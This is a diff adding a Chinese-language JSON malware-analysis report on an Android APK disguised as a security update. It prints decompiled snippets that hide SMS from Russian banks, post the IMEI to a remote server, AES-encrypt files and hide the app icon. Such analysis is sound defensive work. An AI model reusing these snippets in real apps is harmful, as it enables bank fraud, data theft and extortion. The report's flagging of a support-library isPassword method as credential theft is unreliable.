@@ -1,0 +1,187 @@
+{
+  "APK信息": {
+    "文件名": "c86f3ea9002ca83fdf1c8f2c9118c317999ab204d83bbaefc0d959850d49ba50.apk",
+    "sha256": "c86f3ea9002ca83fdf1c8f2c9118c317999ab204d83bbaefc0d959850d49ba50",
+    "包名": "com.example.raccoonapi2",
+    "应用名": "Android Security Update",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 179.2
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.RECEIVE_SMS"
+            ],
+            "字符串": [
+              "SMS_RECEIVED",
+              "abortBroadcast"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\API2\\API2Receiver;",
+          "method_signature": "if(intent.getAction()",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (intent.getAction().contains(\"SMS_RECEIVED\")) {\n    Object[] pduArray = (Object[]) intent.getExtras().get(\"pdus\");\n    SmsMessage[] messages = new SmsMessage[pduArray.length];\n    for (int i = 0; i < pduArray.length; i++) {\n        messages[i] = SmsMessage.createFromPdu((byte[]) pduArray[i]);\n    }\n    String sms_from = messages[0].getDisplayOriginatingAddress();\n    if (sms_from.contains(\"900\") || sms_from.contains(\"7494\") || sms_from.contains(\"Alfa-Bank\") || sms_from.contains(\"QIWI\") || sms_from.contains(\"Sberbank\")) {\n        receiver.abortBroadcast();\n    }\n}",
+          "malicious_code_snippet_context": "          if (!this.pref.contains(\"inaction\") || !this.pref.getBoolean(\"inaction\", false)) {\n              Thread thread = new Thread(new RT());\n              thread.start();\n>>>             if (intent.getAction().contains(\"SMS_RECEIVED\")) {\n>>>                 Object[] pduArray = (Object[]) intent.getExtras().get(\"pdus\");\n>>>                 SmsMessage[] messages = new SmsMessage[pduArray.length];\n>>>                 for (int i = 0; i < pduArray.length; i++) {\n>>>                     messages[i] = SmsMessage.createFromPdu((byte[]) pduArray[i]);\n>>>                 }\n>>>                 String sms_from = messages[0].getDisplayOriginatingAddress();\n>>>                 if (sms_from.contains(\"900\") || sms_from.contains(\"7494\") || sms_from.contains(\"Alfa-Bank\") || sms_from.contains(\"QIWI\") || sms_from.contains(\"Sberbank\")) {\n>>>                     receiver.abortBroadcast();\n>>>                 }\n>>>             }\n          }\n      }\n  ",
+          "behavior_description": "代码监听SMS_RECEIVED广播，从Intent中提取短信PDU数据并解析出发送方地址，当检测到短信来自特定银行或支付机构（如Sberbank、Alfa-Bank、QIWI等）时，调用abortBroadcast()中止广播传递，使系统短信应用和其他应用无法收到该短信，从而隐藏银行通知/验证码短信，属于典型的银行木马短信拦截行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "getDeviceId"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\API2\\ErrorReport;",
+          "method_signature": "doInBackground(String... f_url)",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "TelephonyManager tm = (TelephonyManager) this.context.getSystemService(\"phone\");\nString IMEI = tm.getDeviceId();\nString device = Build.BRAND + \" \" + Build.MODEL + \". Android API \" + Build.VERSION.SDK_INT + \", OS Version \" + System.getProperty(\"os.version\") + \"(\" + Build.VERSION.INCREMENTAL + \")\";\nHttpPost httpPost = new HttpPost(Config.server + Config.ERROR_PAGE);\nnameValuePair.add(new BasicNameValuePair(\"imei\", IMEI));\nnameValuePair.add(new BasicNameValuePair(\"os\", String.valueOf(Build.VERSION.SDK_INT)));\nnameValuePair.add(new BasicNameValuePair(\"device\", device));",
+          "malicious_code_snippet_context": "      /* JADX INFO: Access modifiers changed from: protected */\n      @Override // android.os.AsyncTask\n      public String doInBackground(String... f_url) {\n>>>         TelephonyManager tm = (TelephonyManager) this.context.getSystemService(\"phone\");\n>>>         String IMEI = tm.getDeviceId();\n>>>         String device = Build.BRAND + \" \" + Build.MODEL + \". Android API \" + Build.VERSION.SDK_INT + \", OS Version \" + System.getProperty(\"os.version\") + \"(\" + Build.VERSION.INCREMENTAL + \")\";\n>>>         HttpClient httpClient = new DefaultHttpClient();\n>>>         HttpPost httpPost = new HttpPost(Config.server + Config.ERROR_PAGE);\n>>>         List<NameValuePair> nameValuePair = new ArrayList<>(2);\n>>>         nameValuePair.add(new BasicNameValuePair(\"imei\", IMEI));\n          nameValuePair.add(new BasicNameValuePair(\"os\", String.valueOf(Build.VERSION.SDK_INT)));\n          nameValuePair.add(new BasicNameValuePair(\"alarm\", Config.alarm));\n          nameValuePair.add(new BasicNameValuePair(\"device\", device));",
+          "behavior_description": "代码伪装为错误报告功能，在 AsyncTask 后台线程中通过 TelephonyManager.getDeviceId() 获取设备 IMEI，同时收集设备品牌、型号、Android API 版本、OS 版本等设备指纹信息，将这些数据通过 HTTP POST 请求发送到远程服务器 Config.server，实现设备指纹采集与上报。数据流向：getDeviceId() + Build 属性 → HttpPost 远程服务器",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "confirmed",
+      "子行为": [
+        {
+          "子行为": "file_encryption",
+          "中文名": "文件加密",
+          "置信度": "confirmed",
+          "证据": {
+            "方法引用": [
+              "Ljavax/crypto/Cipher;->doFinal",
+              "Ljavax/crypto/Cipher;->init"
+            ],
+            "权限": [],
+            "字符串": [
+              "AES",
+              "encrypt",
+              "decrypt"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\API2\\CryptoUtil;",
+          "method_signature": "doCrypto(int cipherMode, String key, File inputFile, File outputFile)",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "Key secretKey = new SecretKeySpec(key.getBytes(), \"AES\");\nCipher cipher = Cipher.getInstance(\"AES\");\ncipher.init(cipherMode, secretKey);\nFileInputStream inputStream = new FileInputStream(inputFile);\nbyte[] inputBytes = new byte[(int) inputFile.length()];\ninputStream.read(inputBytes);\nbyte[] outputBytes = cipher.doFinal(inputBytes);\nFileOutputStream outputStream = new FileOutputStream(outputFile);\noutputStream.write(outputBytes);",
+          "malicious_code_snippet_context": "  \n      private static boolean doCrypto(int cipherMode, String key, File inputFile, File outputFile) {\n          try {\n>>>             Key secretKey = new SecretKeySpec(key.getBytes(), \"AES\");\n>>>             Cipher cipher = Cipher.getInstance(\"AES\");\n>>>             cipher.init(cipherMode, secretKey);\n>>>             FileInputStream inputStream = new FileInputStream(inputFile);\n>>>             byte[] inputBytes = new byte[(int) inputFile.length()];\n>>>             inputStream.read(inputBytes);\n>>>             byte[] outputBytes = cipher.doFinal(inputBytes);\n>>>             FileOutputStream outputStream = new FileOutputStream(outputFile);\n>>>             outputStream.write(outputBytes);\n              inputStream.close();\n              outputStream.close();\n              return true;",
+          "behavior_description": "该方法使用AES算法和传入密钥对指定文件进行加密/解密操作。从inputFile读取文件全部内容到内存，通过cipher.doFinal()进行AES加密变换，然后将加密后的数据写入outputFile。在勒索软件场景中，该方法被用于遍历用户设备上的文件并逐个加密，导致用户数据无法正常访问，数据流向为：FileInputStream读取用户文件→AES加密→FileOutputStream覆盖写入加密文件。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "banking_trojan",
+      "中文名": "银行木马",
+      "MITRE": "T1418",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "credential_phishing",
+          "中文名": "凭证钓鱼",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "password"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Landroid\\support\\v4\\view\\accessibility\\AccessibilityNodeInfoCompat;",
+          "method_signature": "?(?)",
+          "malicious_behavior": "banking_trojan",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "boolean isPassword(Object obj);",
+          "malicious_code_snippet_context": "  \n          boolean isLongClickable(Object obj);\n  \n>>>         boolean isPassword(Object obj);\n  \n          boolean isScrollable(Object obj);\n  ",
+          "behavior_description": "代码调用了无障碍节点信息兼容类的isPassword方法，用于判断当前UI节点是否为密码输入框。在恶意样本中，这是银行木马通过滥用无障碍服务窃取用户凭证的典型步骤，通过遍历屏幕节点识别密码框，进而提取其中的内容。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\API2\\MainActivity;",
+          "method_signature": "onCreate(Bundle savedInstanceState)",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "PackageManager p = getPackageManager();\np.setComponentEnabledSetting(getComponentName(), 2, 1);\nIntent intent = new Intent(\"android.intent.action.MAIN\");\nintent.addCategory(\"android.intent.category.HOME\");\nintent.setFlags(268435456);\nstartActivity(intent);\nIntent start = new Intent(this, (Class<?>) My2Service.class);\nstartService(start);",
+          "malicious_code_snippet_context": "      protected void onCreate(Bundle savedInstanceState) {\n          super.onCreate(savedInstanceState);\n          try {\n>>>             PackageManager p = getPackageManager();\n>>>             p.setComponentEnabledSetting(getComponentName(), 2, 1);\n>>>         } catch (Exception e) {\n>>>             e.printStackTrace();\n>>>         }\n>>>         Intent intent = new Intent(\"android.intent.action.MAIN\");\n>>>         intent.addCategory(\"android.intent.category.HOME\");\n>>>         intent.setFlags(268435456);\n          startActivity(intent);\n          Intent start = new Intent(this, (Class<?>) My2Service.class);\n          startService(start);",
+          "behavior_description": "应用启动后立即调用 setComponentEnabledSetting 将自身 MainActivity 组件设置为 DISABLED 状态(参数2=COMPONENT_ENABLED_STATE_DISABLED)，使应用图标从启动器中消失，用户无法通过正常方式找到和卸载该应用。随后发送 HOME Intent 返回桌面，并启动后台服务 My2Service 继续执行恶意逻辑。数据流向：getComponentName() 获取当前组件名 → setComponentEnabledSetting() 禁用组件实现图标隐藏。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
